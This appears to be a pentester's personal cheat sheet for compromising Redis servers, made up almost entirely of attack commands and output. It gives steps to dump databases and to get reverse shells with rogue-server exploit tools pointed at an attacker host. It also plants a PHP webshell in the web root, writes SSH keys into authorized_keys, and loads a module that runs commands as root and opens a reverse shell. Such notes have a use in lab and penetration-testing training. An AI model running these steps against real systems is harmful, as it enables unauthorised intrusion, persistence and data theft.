https://book.hacktricks.wiki/en/network-services-pentesting/6379-pentesting-redis.html?highlight=redis#redis-rce

Look specifically in the RCE section, there are multiple paths

First command
	`info`
		if you get `-NOAUTH Authentication required.`, you need creds

Authenticate
	`AUTH <username> <password>
	this is the standard auth mechanism but NOT always...
		dependent on redis config file

Config file 
	typically here:
	`/etc/redis/redis.config
		if exposed to this, much easier to wget the file for parsing...

There are more possible things you can try, but these are the easy wins:

#### Dumping Databases
After auth
`info`
	look at # Keyspace
`select #
`keys *`
`get <name>

#### Immediate interactive / reverse shell:
https://github.com/n0b0dyCN/redis-rogue-server
For redis versions <= 5.0.5 but I have seen it work on later versions withing 5.0.x so try it anyway
	`./redis-rogue-server.py --rhost <TARGET_IP> --lhost <ACCACKER_IP>

https://github.com/Ridter/redis-rce?tab=readme-ov-file
This is an alternative which allows for Authentication creds. 
	`exp.so` file can be reused from the 1st rogue server.
	`./redis-rce.py -r <victim> -L <our_ip> -a '<AUTH_pass>' -v -f <exp.so_file(take from redis rogue server)>

#### PHP Webshell:
do you have access to a webpage and know the webroot path? We can create a webshell
```
root@Urahara:~# redis-cli -h 10.85.0.52
10.85.0.52:6379> config set dir /usr/share/nginx/html
OK
10.85.0.52:6379> config set dbfilename redis.php
OK
10.85.0.52:6379> set test "<?php phpinfo(); ?>"
OK
10.85.0.52:6379> save
OK
```
then just visit the webpage and start issuing commands


#### SSH
We can write ssh keys to user home directories that we have perms to. /var/lib/redis/.ssh or /home/redis/.ssh/ are common.
```
# SSH keygen
	ssh-keygen -r rsa

# Write public key to file
	(echo -e "\n\n"; cat id_rsa.pub; echo -e "\n\n") > spaced_key.txt

# Import file into redis
	cat spaced_key.txt | redis-cli -h <ip> -x set ssh_key

# Save the public key to authorized_keys on redis server
	config set dir /path/to/.ssh/dir
	config set dbfilename "authorized_keys"
	save

# SSH in
	ssh -i id_rsa redis@<ip>

```

#### Load Redis Module
Are you able to upload files onto the machine? We can use this
```
Following the instructions from https://github.com/n0b0dyCN/RedisModules-ExecuteCommand, you can compile a redis module to execute arbitrary commands.
	use precompiled exp_lin.so file from here https://github.com/jas502n/Redis-RCE

Then you need some way to upload the compiled module 
	FTP, SMB, etc...

Connect to redis
	redis-cli -h <ip_address>

Load the uploaded module
	MODULE LOAD /path/to/exp_lin.so

List loaded modules to check it was correctly loaded: MODULE LIST
	MODULE LIST

Execute commands:
	127.0.0.1:6379> system.exec "id"
	"uid=0(root) gid=0(root) groups=0(root)\n"
	127.0.0.1:6379> system.exec "whoami"
	"root\n"
	127.0.0.1:6379> system.rev 127.0.0.1 9999

Unload the module whenever you want: MODULE UNLOAD mymodule
```